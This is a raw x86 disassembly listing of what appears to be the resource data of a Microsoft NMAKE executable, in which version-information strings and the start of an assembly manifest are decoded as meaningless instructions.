  43a655:	add    BYTE PTR ds:0x27007300,ah
  43a65b:	add    BYTE PTR [eax],ah
  43a65d:	add    BYTE PTR [edx],bh
  43a65f:	add    BYTE PTR [eax],ah
  43a661:	add    BYTE PTR [esi+0x0],cl
  43a664:	push   esp
  43a665:	add    BYTE PTR [esi+0x0],dl
  43a668:	inc    esp
  43a669:	add    BYTE PTR [ebp+0x0],cl
  43a66c:	and    BYTE PTR [eax],al
  43a66e:	je     0x43a670
  43a670:	imul   eax,DWORD PTR [eax],0x65006d
  43a676:	outs   dx,DWORD PTR ds:[esi]
  43a677:	add    BYTE PTR [ebp+0x0],dh
  43a67a:	je     0x43a67c
  43a67c:	and    BYTE PTR [eax],al
  43a67e:	imul   eax,DWORD PTR [eax],0x20006e
  43a684:	jb     0x43a686
  43a686:	add    BYTE PTR gs:[eax+eax*1+0x72],dh
  43a68b:	add    BYTE PTR [ecx+0x0],ch
  43a68e:	add    BYTE PTR gs:[esi+0x0],dh
  43a692:	imul   eax,DWORD PTR [eax],0x67006e
  43a698:	and    BYTE PTR [eax],al
  43a69a:	jb     0x43a69c
  43a69c:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  43a6a1:	add    BYTE PTR [edx+0x0],dh
  43a6a4:	outs   dx,BYTE PTR ds:[esi]
  43a6a5:	add    BYTE PTR [eax],ah
  43a6a7:	add    BYTE PTR [ebx+0x0],ah
  43a6aa:	outs   dx,DWORD PTR ds:[esi]
  43a6ab:	add    BYTE PTR [eax+eax*1+0x65],ah
  43a6af:	add    BYTE PTR [eax+eax*1],ch
  43a6b2:	and    BYTE PTR [eax],al
  43a6b4:	popa   
  43a6b5:	add    BYTE PTR [ebx+0x0],dh
  43a6b8:	jae    0x43a6ba
  43a6ba:	jne    0x43a6bc
  43a6bc:	ins    DWORD PTR es:[edi],dx
  43a6bd:	add    BYTE PTR [ecx+0x0],ch
  43a6c0:	outs   dx,BYTE PTR ds:[esi]
  43a6c1:	add    BYTE PTR [edi+0x0],ah
  43a6c4:	and    BYTE PTR [eax],al
  43a6c6:	arpl   WORD PTR [eax],ax
  43a6c8:	outs   dx,DWORD PTR ds:[esi]
  43a6c9:	add    BYTE PTR [ebp+0x0],ch
  43a6cc:	ins    DWORD PTR es:[edi],dx
  43a6cd:	add    BYTE PTR [ecx+0x0],ah
  43a6d0:	outs   dx,BYTE PTR ds:[esi]
  43a6d1:	add    BYTE PTR [eax+eax*1+0x20],ah
  43a6d5:	add    BYTE PTR [edi+0x0],dh
  43a6d8:	popa   
  43a6d9:	add    BYTE PTR [ebx+0x0],dh
  43a6dc:	and    BYTE PTR [eax],al
  43a6de:	jae    0x43a6e0
  43a6e0:	jne    0x43a6e2
  43a6e2:	arpl   WORD PTR [eax],ax
  43a6e4:	arpl   WORD PTR [eax],ax
  43a6e6:	add    BYTE PTR gs:[ebx+0x0],dh
  43a6ea:	jae    0x43a6ec
  43a6ec:	data16 add BYTE PTR [ebp+0x0],dh
  43a6f0:	ins    BYTE PTR es:[edi],dx
  43a6f1:	add    BYTE PTR [eax],al
  43a6f3:	add    BYTE PTR [edx+0x0],al
  43a6f6:	daa    
  43a6f7:	add    BYTE PTR ds:0x27007300,ah
  43a6fd:	add    BYTE PTR [eax],ah
  43a6ff:	add    BYTE PTR [edx],bh
  43a701:	add    BYTE PTR [eax],ah
  43a703:	add    BYTE PTR [esi+0x0],cl
  43a706:	push   esp
  43a707:	add    BYTE PTR [esi+0x0],dl
  43a70a:	inc    esp
  43a70b:	add    BYTE PTR [ebp+0x0],cl
  43a70e:	and    BYTE PTR [eax],al
  43a710:	je     0x43a712
  43a712:	imul   eax,DWORD PTR [eax],0x65006d
  43a718:	outs   dx,DWORD PTR ds:[esi]
  43a719:	add    BYTE PTR [ebp+0x0],dh
  43a71c:	je     0x43a71e
  43a71e:	and    BYTE PTR [eax],al
  43a720:	imul   eax,DWORD PTR [eax],0x20006e
  43a726:	jb     0x43a728
  43a728:	add    BYTE PTR gs:[eax+eax*1+0x72],dh
  43a72d:	add    BYTE PTR [ecx+0x0],ch
  43a730:	add    BYTE PTR gs:[esi+0x0],dh
  43a734:	imul   eax,DWORD PTR [eax],0x67006e
  43a73a:	and    BYTE PTR [eax],al
  43a73c:	jb     0x43a73e
  43a73e:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  43a743:	add    BYTE PTR [edx+0x0],dh
  43a746:	outs   dx,BYTE PTR ds:[esi]
  43a747:	add    BYTE PTR [eax],ah
  43a749:	add    BYTE PTR [ebx+0x0],ah
  43a74c:	outs   dx,DWORD PTR ds:[esi]
  43a74d:	add    BYTE PTR [eax+eax*1+0x65],ah
  43a751:	add    BYTE PTR [eax+eax*1],ch
  43a754:	and    BYTE PTR [eax],al
  43a756:	jb     0x43a758
  43a758:	add    BYTE PTR gs:[edx+0x0],dh
  43a75c:	jne    0x43a75e
  43a75e:	outs   dx,BYTE PTR ds:[esi]
  43a75f:	add    BYTE PTR [esi+0x0],ch
  43a762:	imul   eax,DWORD PTR [eax],0x67006e
  43a768:	and    BYTE PTR [eax],al
  43a76a:	arpl   WORD PTR [eax],ax
  43a76c:	outs   dx,DWORD PTR ds:[esi]
  43a76d:	add    BYTE PTR [ebp+0x0],ch
  43a770:	ins    DWORD PTR es:[edi],dx
  43a771:	add    BYTE PTR [ecx+0x0],ah
  43a774:	outs   dx,BYTE PTR ds:[esi]
  43a775:	add    BYTE PTR [eax+eax*1+0x0],ah
  43a779:	add    BYTE PTR [edi+0x0],dl
  43a77c:	ins    DWORD PTR es:[edi],dx
  43a77d:	add    BYTE PTR [ebp+0x0],dh
  43a780:	jae    0x43a782
  43a782:	je     0x43a784
  43a784:	and    BYTE PTR [eax],al
  43a786:	jb     0x43a788
  43a788:	add    BYTE PTR gs:[ecx+0x0],ah
  43a78c:	add    BYTE PTR fs:[eax],ah
  43a78f:	add    BYTE PTR [ecx+0x0],ah
  43a792:	outs   dx,BYTE PTR ds:[esi]
  43a793:	add    BYTE PTR [eax+eax*1+0x20],ah
  43a797:	add    BYTE PTR [ecx+0x0],ah
  43a79a:	add    BYTE PTR [bp+si+0x0],dh
  43a79e:	add    BYTE PTR gs:[ebp+0x0],ah
  43a7a2:	and    BYTE PTR [eax],al
  43a7a4:	je     0x43a7a6
  43a7a6:	outs   dx,DWORD PTR ds:[esi]
  43a7a7:	add    BYTE PTR [eax],ah
  43a7a9:	add    BYTE PTR [eax+eax*1+0x68],dh
  43a7ad:	add    BYTE PTR [ebp+0x0],ah
  43a7b0:	and    BYTE PTR [eax],al
  43a7b2:	inc    esp
  43a7b3:	add    BYTE PTR [ecx+0x0],ah
  43a7b6:	je     0x43a7b8
  43a7b8:	popa   
  43a7b9:	add    BYTE PTR [eax],ah
  43a7bb:	add    BYTE PTR [ebx+0x0],al
  43a7be:	outs   dx,DWORD PTR ds:[esi]
  43a7bf:	add    BYTE PTR [eax+eax*1+0x6c],ch
  43a7c3:	add    BYTE PTR [ebp+0x0],ah
  43a7c6:	arpl   WORD PTR [eax],ax
  43a7c8:	je     0x43a7ca
  43a7ca:	imul   eax,DWORD PTR [eax],0x6e006f
  43a7d0:	and    BYTE PTR [eax],al
  43a7d2:	push   eax
  43a7d3:	add    BYTE PTR [edi+0x0],ch
  43a7d6:	ins    BYTE PTR es:[edi],dx
  43a7d7:	add    BYTE PTR [ecx+0x0],ch
  43a7da:	arpl   WORD PTR [eax],ax
  43a7dc:	jns    0x43a7de
  43a7de:	and    BYTE PTR [eax],al
  43a7e0:	popa   
  43a7e1:	add    BYTE PTR [eax+eax*1+0x20],dh
  43a7e5:	add    BYTE PTR ds:0x20007300,ah
  43a7eb:	add    BYTE PTR [edx+0x0],ah
  43a7ee:	add    BYTE PTR gs:[esi+0x0],ah
  43a7f2:	outs   dx,DWORD PTR ds:[esi]
  43a7f3:	add    BYTE PTR [edx+0x0],dh
  43a7f6:	add    BYTE PTR gs:[eax],ah
  43a7f9:	add    BYTE PTR [ebp+0x0],dh
  43a7fc:	jae    0x43a7fe
  43a7fe:	imul   eax,DWORD PTR [eax],0x67006e
  43a804:	and    BYTE PTR [eax],al
  43a806:	das    
  43a807:	add    BYTE PTR [ebp+0x0],ah
  43a80a:	jb     0x43a80c
  43a80c:	jb     0x43a80e
  43a80e:	outs   dx,DWORD PTR ds:[esi]
  43a80f:	add    BYTE PTR [edx+0x0],dh
  43a812:	jb     0x43a814
  43a814:	add    BYTE PTR gs:[eax+0x0],dh
  43a818:	outs   dx,DWORD PTR ds:[esi]
  43a819:	add    BYTE PTR [edx+0x0],dh
  43a81c:	je     0x43a81e
  43a81e:	cmp    al,BYTE PTR [eax]
  43a820:	jae    0x43a822
  43a822:	add    BYTE PTR gs:[esi+0x0],ch
  43a826:	add    BYTE PTR fs:[eax],al
  43a829:	add    BYTE PTR [eax],al
  43a82b:	add    BYTE PTR [eax+0x3403],dl
  43a831:	add    BYTE PTR [esi+0x0],dl
  43a834:	push   ebx
  43a835:	add    BYTE PTR [edi+0x0],bl
  43a838:	push   esi
  43a839:	add    BYTE PTR [ebp+0x0],al
  43a83c:	push   edx
  43a83d:	add    BYTE PTR [ebx+0x0],dl
  43a840:	dec    ecx
  43a841:	add    BYTE PTR [edi+0x0],cl
  43a844:	dec    esi
  43a845:	add    BYTE PTR [edi+0x0],bl
  43a848:	dec    ecx
  43a849:	add    BYTE PTR [esi+0x0],cl
  43a84c:	inc    esi
  43a84d:	add    BYTE PTR [edi+0x0],cl
  43a850:	add    BYTE PTR [eax],al
  43a852:	add    BYTE PTR [eax],al
  43a854:	mov    ebp,0xfeef04
  43a859:	add    BYTE PTR [ecx],al
  43a85b:	add    BYTE PTR [eax],al
  43a85d:	add    BYTE PTR [ebx],cl
  43a85f:	add    BYTE PTR [ecx],al
  43a861:	add    BYTE PTR [edi],ah
  43a863:	mov    BYTE PTR [eax],0x0
  43a866:	or     eax,DWORD PTR [eax]
  43a868:	add    DWORD PTR [eax],eax
  43a86a:	daa    
  43a86b:	(bad)  
  43a86c:	aas    
  43a86d:	add    BYTE PTR [eax],al
  43a86f:	add    BYTE PTR [eax],al
  43a871:	add    BYTE PTR [eax],al
  43a873:	add    BYTE PTR [eax+eax*1],al
  43a876:	add    BYTE PTR [eax],al
  43a878:	add    DWORD PTR [eax],eax
	...
  43a886:	add    BYTE PTR [eax],al
  43a888:	lock add al,BYTE PTR [eax]
  43a88b:	add    BYTE PTR [ecx],al
  43a88d:	add    BYTE PTR [ebx+0x0],dl
  43a890:	je     0x43a892
  43a892:	jb     0x43a894
  43a894:	imul   eax,DWORD PTR [eax],0x67006e
  43a89a:	inc    esi
  43a89b:	add    BYTE PTR [ecx+0x0],ch
  43a89e:	ins    BYTE PTR es:[edi],dx
  43a89f:	add    BYTE PTR [ebp+0x0],ah
  43a8a2:	dec    ecx
  43a8a3:	add    BYTE PTR [esi+0x0],ch
  43a8a6:	data16 add BYTE PTR [edi+0x0],ch
  43a8aa:	add    BYTE PTR [eax],al
  43a8ac:	int3   
  43a8ad:	add    al,BYTE PTR [eax]
  43a8af:	add    BYTE PTR [ecx],al
  43a8b1:	add    BYTE PTR [eax],dh
  43a8b3:	add    BYTE PTR [eax+eax*1],dh
  43a8b6:	xor    BYTE PTR [eax],al
  43a8b8:	cmp    DWORD PTR [eax],eax
  43a8ba:	xor    BYTE PTR [eax],al
  43a8bc:	xor    al,0x0
  43a8be:	inc    edx
  43a8bf:	add    BYTE PTR [eax],dh
  43a8c1:	add    BYTE PTR [eax],al
  43a8c3:	add    BYTE PTR [eax+eax*1+0x16],cl
  43a8c7:	add    BYTE PTR [ecx],al
  43a8c9:	add    BYTE PTR [ebx+0x0],al
  43a8cc:	outs   dx,DWORD PTR ds:[esi]
  43a8cd:	add    BYTE PTR [ebp+0x0],ch
  43a8d0:	jo     0x43a8d2
  43a8d2:	popa   
  43a8d3:	add    BYTE PTR [esi+0x0],ch
  43a8d6:	jns    0x43a8d8
  43a8d8:	dec    esi
  43a8d9:	add    BYTE PTR [ecx+0x0],ah
  43a8dc:	ins    DWORD PTR es:[edi],dx
  43a8dd:	add    BYTE PTR [ebp+0x0],ah
  43a8e0:	add    BYTE PTR [eax],al
  43a8e2:	add    BYTE PTR [eax],al
  43a8e4:	dec    ebp
  43a8e5:	add    BYTE PTR [ecx+0x0],ch
  43a8e8:	arpl   WORD PTR [eax],ax
  43a8ea:	jb     0x43a8ec
  43a8ec:	outs   dx,DWORD PTR ds:[esi]
  43a8ed:	add    BYTE PTR [ebx+0x0],dh
  43a8f0:	outs   dx,DWORD PTR ds:[esi]
  43a8f1:	add    BYTE PTR [esi+0x0],ah
  43a8f4:	je     0x43a8f6
  43a8f6:	and    BYTE PTR [eax],al
  43a8f8:	inc    ebx
  43a8f9:	add    BYTE PTR [edi+0x0],ch
  43a8fc:	jb     0x43a8fe
  43a8fe:	jo     0x43a900
  43a900:	outs   dx,DWORD PTR ds:[esi]
  43a901:	add    BYTE PTR [edx+0x0],dh
  43a904:	popa   
  43a905:	add    BYTE PTR [eax+eax*1+0x69],dh
  43a909:	add    BYTE PTR [edi+0x0],ch
  43a90c:	outs   dx,BYTE PTR ds:[esi]
  43a90d:	add    BYTE PTR [eax],al
  43a90f:	add    BYTE PTR [esi+0x0],dh
  43a912:	daa    
  43a913:	add    BYTE PTR [ecx],al
  43a915:	add    BYTE PTR [esi+0x0],al
  43a918:	imul   eax,DWORD PTR [eax],0x65006c
  43a91e:	inc    esp
  43a91f:	add    BYTE PTR [ebp+0x0],ah
  43a922:	jae    0x43a924
  43a924:	arpl   WORD PTR [eax],ax
  43a926:	jb     0x43a928
  43a928:	imul   eax,DWORD PTR [eax],0x740070
  43a92e:	imul   eax,DWORD PTR [eax],0x6e006f
  43a934:	add    BYTE PTR [eax],al
  43a936:	add    BYTE PTR [eax],al
  43a938:	dec    ebp
  43a939:	add    BYTE PTR [ecx+0x0],ch
  43a93c:	arpl   WORD PTR [eax],ax
  43a93e:	jb     0x43a940
  43a940:	outs   dx,DWORD PTR ds:[esi]
  43a941:	add    BYTE PTR [ebx+0x0],dh
  43a944:	outs   dx,DWORD PTR ds:[esi]
  43a945:	add    BYTE PTR [esi+0x0],ah
  43a948:	je     0x43a94a
  43a94a:	scas   al,BYTE PTR es:[edi]
  43a94b:	add    BYTE PTR [eax],ah
  43a94d:	add    BYTE PTR [eax+0x0],dl
  43a950:	jb     0x43a952
  43a952:	outs   dx,DWORD PTR ds:[esi]
  43a953:	add    BYTE PTR [edi+0x0],ah
  43a956:	jb     0x43a958
  43a958:	popa   
  43a959:	add    BYTE PTR [ebp+0x0],ch
  43a95c:	and    BYTE PTR [eax],al
  43a95e:	dec    ebp
  43a95f:	add    BYTE PTR [ecx+0x0],ah
  43a962:	imul   eax,DWORD PTR [eax],0x74006e
  43a968:	add    BYTE PTR gs:[esi+0x0],ch
  43a96c:	popa   
  43a96d:	add    BYTE PTR [esi+0x0],ch
  43a970:	arpl   WORD PTR [eax],ax
  43a972:	add    BYTE PTR gs:[eax],ah
  43a975:	add    BYTE PTR [ebp+0x0],dl
  43a978:	je     0x43a97a
  43a97a:	imul   eax,DWORD PTR [eax],0x69006c
  43a980:	je     0x43a982
  43a982:	jns    0x43a984
  43a984:	add    BYTE PTR [eax],al
  43a986:	add    BYTE PTR [eax],al
  43a988:	pop    esi
  43a989:	add    BYTE PTR [edi],bl
  43a98b:	add    BYTE PTR [ecx],al
  43a98d:	add    BYTE PTR [esi+0x0],al
  43a990:	imul   eax,DWORD PTR [eax],0x65006c
  43a996:	push   esi
  43a997:	add    BYTE PTR [ebp+0x0],ah
  43a99a:	jb     0x43a99c
  43a99c:	jae    0x43a99e
  43a99e:	imul   eax,DWORD PTR [eax],0x6e006f
  43a9a4:	add    BYTE PTR [eax],al
  43a9a6:	add    BYTE PTR [eax],al
  43a9a8:	xor    DWORD PTR [eax],eax
  43a9aa:	xor    DWORD PTR [eax],eax
  43a9ac:	add    BYTE PTR cs:[eax],dh
  43a9af:	add    BYTE PTR [eax],dh
  43a9b1:	add    BYTE PTR [esi],ch
  43a9b3:	add    BYTE PTR ds:0x37003000,dh
  43a9b9:	add    BYTE PTR [edx],dh
  43a9bb:	add    BYTE PTR [edi],dh
  43a9bd:	add    BYTE PTR [esi],ch
  43a9bf:	add    BYTE PTR [ecx],dh
  43a9c1:	add    BYTE PTR [eax],ah
  43a9c3:	add    BYTE PTR [edx+0x0],ah
  43a9c6:	jne    0x43a9c8
  43a9c8:	imul   eax,DWORD PTR [eax],0x74006c
  43a9ce:	and    BYTE PTR [eax],al
  43a9d0:	bound  eax,QWORD PTR [eax]
  43a9d2:	jns    0x43a9d4
  43a9d4:	cmp    al,BYTE PTR [eax]
  43a9d6:	and    BYTE PTR [eax],al
  43a9d8:	push   edx
  43a9d9:	add    BYTE PTR [eax+eax*1+0x4d],dl
  43a9dd:	add    BYTE PTR [edx+0x0],dl
  43a9e0:	inc    ebp
  43a9e1:	add    BYTE PTR [eax+eax*1+0x0],cl
  43a9e5:	add    BYTE PTR [eax],al
  43a9e7:	add    BYTE PTR [eax+eax*1],dh
  43a9ea:	or     al,BYTE PTR [eax]
  43a9ec:	add    DWORD PTR [eax],eax
  43a9ee:	dec    ecx
  43a9ef:	add    BYTE PTR [esi+0x0],ch
  43a9f2:	je     0x43a9f4
  43a9f4:	add    BYTE PTR gs:[edx+0x0],dh
  43a9f8:	outs   dx,BYTE PTR ds:[esi]
  43a9f9:	add    BYTE PTR [ecx+0x0],ah
  43a9fc:	ins    BYTE PTR es:[edi],dx
  43a9fd:	add    BYTE PTR [esi+0x0],cl
  43aa00:	popa   
  43aa01:	add    BYTE PTR [ebp+0x0],ch
  43aa04:	add    BYTE PTR gs:[eax],al
  43aa07:	add    BYTE PTR [esi+0x0],cl
  43aa0a:	dec    ebp
  43aa0b:	add    BYTE PTR [ecx+0x0],al
  43aa0e:	dec    ebx
  43aa0f:	add    BYTE PTR [ebp+0x0],al
  43aa12:	add    BYTE PTR cs:[ebp+0x0],al
  43aa16:	pop    eax
  43aa17:	add    BYTE PTR [ebp+0x0],al
  43aa1a:	add    BYTE PTR [eax],al
  43aa1c:	add    BYTE PTR [eax],0x2e
  43aa1f:	add    BYTE PTR [ecx],al
  43aa21:	add    BYTE PTR [eax+eax*1+0x65],cl
  43aa25:	add    BYTE PTR [edi+0x0],ah
  43aa28:	popa   
  43aa29:	add    BYTE PTR [eax+eax*1+0x43],ch
  43aa2d:	add    BYTE PTR [edi+0x0],ch
  43aa30:	jo     0x43aa32
  43aa32:	jns    0x43aa34
  43aa34:	jb     0x43aa36
  43aa36:	imul   eax,DWORD PTR [eax],0x680067
  43aa3c:	je     0x43aa3e
  43aa3e:	add    BYTE PTR [eax],al
  43aa40:	test   eax,0x4d002000
  43aa45:	add    BYTE PTR [ecx+0x0],ch
  43aa48:	arpl   WORD PTR [eax],ax
  43aa4a:	jb     0x43aa4c
  43aa4c:	outs   dx,DWORD PTR ds:[esi]
  43aa4d:	add    BYTE PTR [ebx+0x0],dh
  43aa50:	outs   dx,DWORD PTR ds:[esi]
  43aa51:	add    BYTE PTR [esi+0x0],ah
  43aa54:	je     0x43aa56
  43aa56:	and    BYTE PTR [eax],al
  43aa58:	inc    ebx
  43aa59:	add    BYTE PTR [edi+0x0],ch
  43aa5c:	jb     0x43aa5e
  43aa5e:	jo     0x43aa60
  43aa60:	outs   dx,DWORD PTR ds:[esi]
  43aa61:	add    BYTE PTR [edx+0x0],dh
  43aa64:	popa   
  43aa65:	add    BYTE PTR [eax+eax*1+0x69],dh
  43aa69:	add    BYTE PTR [edi+0x0],ch
  43aa6c:	outs   dx,BYTE PTR ds:[esi]
  43aa6d:	add    BYTE PTR [esi],ch
  43aa6f:	add    BYTE PTR [eax],ah
  43aa71:	add    BYTE PTR [ecx+0x0],al
  43aa74:	ins    BYTE PTR es:[edi],dx
  43aa75:	add    BYTE PTR [eax+eax*1+0x20],ch
  43aa79:	add    BYTE PTR [edx+0x0],dh
  43aa7c:	imul   eax,DWORD PTR [eax],0x680067
  43aa82:	je     0x43aa84
  43aa84:	jae    0x43aa86
  43aa86:	and    BYTE PTR [eax],al
  43aa88:	jb     0x43aa8a
  43aa8a:	add    BYTE PTR gs:[ebx+0x0],dh
  43aa8e:	add    BYTE PTR gs:[edx+0x0],dh
  43aa92:	jbe    0x43aa94
  43aa94:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  43aa99:	add    BYTE PTR [eax],al
  43aa9b:	add    BYTE PTR [eax+eax*1],bh
  43aa9e:	or     al,BYTE PTR [eax]
  43aaa0:	add    DWORD PTR [eax],eax
  43aaa2:	dec    edi
  43aaa3:	add    BYTE PTR [edx+0x0],dh
  43aaa6:	imul   eax,DWORD PTR [eax],0x690067
  43aaac:	outs   dx,BYTE PTR ds:[esi]
  43aaad:	add    BYTE PTR [ecx+0x0],ah
  43aab0:	ins    BYTE PTR es:[edi],dx
  43aab1:	add    BYTE PTR [esi+0x0],al
  43aab4:	imul   eax,DWORD PTR [eax],0x65006c
  43aaba:	outs   dx,BYTE PTR ds:[esi]
  43aabb:	add    BYTE PTR [ecx+0x0],ah
  43aabe:	ins    DWORD PTR es:[edi],dx
  43aabf:	add    BYTE PTR [ebp+0x0],ah
  43aac2:	add    BYTE PTR [eax],al
  43aac4:	dec    esi
  43aac5:	add    BYTE PTR [ebp+0x0],cl
  43aac8:	inc    ecx
  43aac9:	add    BYTE PTR [ebx+0x0],cl
  43aacc:	inc    ebp
  43aacd:	add    BYTE PTR [esi],ch
  43aacf:	add    BYTE PTR [ebp+0x0],al
  43aad2:	pop    eax
  43aad3:	add    BYTE PTR [ebp+0x0],al
  43aad6:	add    BYTE PTR [eax],al
  43aad8:	pop    esi
  43aad9:	add    BYTE PTR [edi],bl
  43aadb:	add    BYTE PTR [ecx],al
  43aadd:	add    BYTE PTR [eax+0x0],dl
  43aae0:	jb     0x43aae2
  43aae2:	outs   dx,DWORD PTR ds:[esi]
  43aae3:	add    BYTE PTR [eax+eax*1+0x75],ah
  43aae7:	add    BYTE PTR [ebx+0x0],ah
  43aaea:	je     0x43aaec
  43aaec:	dec    esi
  43aaed:	add    BYTE PTR [ecx+0x0],ah
  43aaf0:	ins    DWORD PTR es:[edi],dx
  43aaf1:	add    BYTE PTR [ebp+0x0],ah
  43aaf4:	add    BYTE PTR [eax],al
  43aaf6:	add    BYTE PTR [eax],al
  43aaf8:	dec    ebp
  43aaf9:	add    BYTE PTR [ecx+0x0],ch
  43aafc:	arpl   WORD PTR [eax],ax
  43aafe:	jb     0x43ab00
  43ab00:	outs   dx,DWORD PTR ds:[esi]
  43ab01:	add    BYTE PTR [ebx+0x0],dh
  43ab04:	outs   dx,DWORD PTR ds:[esi]
  43ab05:	add    BYTE PTR [esi+0x0],ah
  43ab08:	je     0x43ab0a
  43ab0a:	scas   al,BYTE PTR es:[edi]
  43ab0b:	add    BYTE PTR [eax],ah
  43ab0d:	add    BYTE PTR [esi+0x0],dl
  43ab10:	imul   eax,DWORD PTR [eax],0x750073
  43ab16:	popa   
  43ab17:	add    BYTE PTR [eax+eax*1+0x20],ch
  43ab1b:	add    BYTE PTR [ebx+0x0],dl
  43ab1e:	je     0x43ab20
  43ab20:	jne    0x43ab22
  43ab22:	add    BYTE PTR fs:[ecx+0x0],ch
  43ab26:	outs   dx,DWORD PTR ds:[esi]
  43ab27:	add    BYTE PTR [esi+0x32002000],ch
  43ab2d:	add    BYTE PTR [eax],dh
  43ab2f:	add    BYTE PTR [ecx],dh
  43ab31:	add    BYTE PTR [edx],dh
  43ab33:	add    BYTE PTR [eax],al
  43ab35:	add    BYTE PTR [eax],al
  43ab37:	add    BYTE PTR [eax+0x0],al
  43ab3a:	push   cs
  43ab3b:	add    BYTE PTR [ecx],al
  43ab3d:	add    BYTE PTR [eax+0x0],dl
  43ab40:	jb     0x43ab42
  43ab42:	outs   dx,DWORD PTR ds:[esi]
  43ab43:	add    BYTE PTR [eax+eax*1+0x75],ah
  43ab47:	add    BYTE PTR [ebx+0x0],ah
  43ab4a:	je     0x43ab4c
  43ab4c:	push   esi
  43ab4d:	add    BYTE PTR [ebp+0x0],ah
  43ab50:	jb     0x43ab52
  43ab52:	jae    0x43ab54
  43ab54:	imul   eax,DWORD PTR [eax],0x6e006f
  43ab5a:	add    BYTE PTR [eax],al
  43ab5c:	xor    DWORD PTR [eax],eax
  43ab5e:	xor    DWORD PTR [eax],eax
  43ab60:	add    BYTE PTR cs:[eax],dh
  43ab63:	add    BYTE PTR [eax],dh
  43ab65:	add    BYTE PTR [esi],ch
  43ab67:	add    BYTE PTR ds:0x37003000,dh
  43ab6d:	add    BYTE PTR [edx],dh
  43ab6f:	add    BYTE PTR [edi],dh
  43ab71:	add    BYTE PTR [esi],ch
  43ab73:	add    BYTE PTR [ecx],dh
  43ab75:	add    BYTE PTR [eax],al
  43ab77:	add    BYTE PTR [eax+eax*1+0x0],al
  43ab7b:	add    BYTE PTR [ecx],al
  43ab7d:	add    BYTE PTR [esi+0x0],dl
  43ab80:	popa   
  43ab81:	add    BYTE PTR [edx+0x0],dh
  43ab84:	inc    esi
  43ab85:	add    BYTE PTR [ecx+0x0],ch
  43ab88:	ins    BYTE PTR es:[edi],dx
  43ab89:	add    BYTE PTR [ebp+0x0],ah
  43ab8c:	dec    ecx
  43ab8d:	add    BYTE PTR [esi+0x0],ch
  43ab90:	data16 add BYTE PTR [edi+0x0],ch
  43ab94:	add    BYTE PTR [eax],al
  43ab96:	add    BYTE PTR [eax],al
  43ab98:	and    al,0x0
  43ab9a:	add    al,0x0
  43ab9c:	add    BYTE PTR [eax],al
  43ab9e:	push   esp
  43ab9f:	add    BYTE PTR [edx+0x0],dh
  43aba2:	popa   
  43aba3:	add    BYTE PTR [esi+0x0],ch
  43aba6:	jae    0x43aba8
  43aba8:	ins    BYTE PTR es:[edi],dx
  43aba9:	add    BYTE PTR [ecx+0x0],ah
  43abac:	je     0x43abae
  43abae:	imul   eax,DWORD PTR [eax],0x6e006f
  43abb4:	add    BYTE PTR [eax],al
  43abb6:	add    BYTE PTR [eax],al
  43abb8:	or     DWORD PTR [eax+esi*4],eax
  43abbb:	add    al,0x3c
  43abbd:	popa   
  43abbe:	jae    0x43ac33
  43abc0:	gs ins DWORD PTR es:[edi],dx
  43abc2:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  43abc6:	js     0x43ac35
  43abc8:	ins    BYTE PTR es:[edi],dx
  43abc9:	outs   dx,BYTE PTR ds:[esi]
  43abca:	jae    0x43ac09
  43abcc:	and    dh,BYTE PTR [ebp+0x72]
  43abcf:	outs   dx,BYTE PTR ds:[esi]
  43abd0:	cmp    dh,BYTE PTR [ebx+0x63]
  43abd3:	push   0x73616d65
  43abd8:	sub    eax,0x7263696d
  43abdd:	outs   dx,DWORD PTR ds:[esi]
  43abde:	jae    0x43ac4f
  43abe0:	data16 je 0x43ac10
  43abe3:	arpl   WORD PTR [edi+0x6d],bp
  43abe6:	cmp    ah,BYTE PTR [ecx+0x73]
  43abe9:	ins    DWORD PTR es:[edi],dx
  43abea:	cs jbe 0x43ac1e
  43abed:	and    ah,BYTE PTR [eax]
  43abef:	ins    DWORD PTR es:[edi],dx
  43abf0:	popa   
  43abf1:	outs   dx,BYTE PTR ds:[esi]
  43abf2:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  43abf9:	jb     0x43ac6e
  43abfb:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  43ac02:	xor    BYTE PTR [edx],ah
  43ac04:	ds cmp al,0x61
  43ac07:	jae    0x43ac7c
  43ac09:	gs ins DWORD PTR es:[edi],dx
  43ac0b:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  43ac0f:	fs outs dx,BYTE PTR gs:[esi]
  43ac12:	je     0x43ac7d
  43ac14:	je     0x43ac8f
  43ac16:	and    BYTE PTR [esi+0x65],dh
  43ac19:	jb     0x43ac8e
  43ac1b:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  43ac22:	xor    BYTE PTR [esi],ch
  43ac24:	xor    BYTE PTR [esi],ch
  43ac26:	xor    BYTE PTR [edx],ah
  43ac28:	and    BYTE PTR [eax+0x72],dh
  43ac2b:	outs   dx,DWORD PTR ds:[esi]
  43ac2c:	arpl   WORD PTR [ebp+0x73],sp
  43ac2f:	jae    0x43aca0
  43ac31:	jb     0x43ac74
  43ac33:	jb     0x43ac98
  43ac35:	push   0x63657469
  43ac3a:	je     0x43acb1
  43ac3c:	jb     0x43aca3
  43ac3e:	cmp    eax,0x36385822
  43ac43:	and    ah,BYTE PTR [eax]
  43ac45:	outs   dx,BYTE PTR ds:[esi]
  43ac46:	popa   
  43ac47:	ins    DWORD PTR es:[edi],dx
  43ac48:	gs cmp eax,0x616d6e22
  43ac4e:	imul   esp,DWORD PTR [ebp+0x22],0x20
  43ac52:	je     0x43accd
  43ac54:	jo     0x43acbb
  43ac56:	cmp    eax,0x6e697722
  43ac5b:	xor    esi,DWORD PTR [edx]
  43ac5d:	and    bh,BYTE PTR [esi]
  43ac5f:	cmp    al,0x2f
  43ac61:	popa   
  43ac62:	jae    0x43acd7
  43ac64:	gs ins DWORD PTR es:[edi],dx
  43ac66:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  43ac6a:	fs outs dx,BYTE PTR gs:[esi]
  43ac6d:	je     0x43acd8
  43ac6f:	je     0x43acea
  43ac71:	ds cmp al,0x74
  43ac74:	jb     0x43aceb
  43ac76:	jae    0x43acec
  43ac78:	dec    ecx
  43ac79:	outs   dx,BYTE PTR ds:[esi]
  43ac7a:	outs   dx,WORD PTR ds:[esi]
  43ac7c:	and    BYTE PTR [eax+0x6d],bh
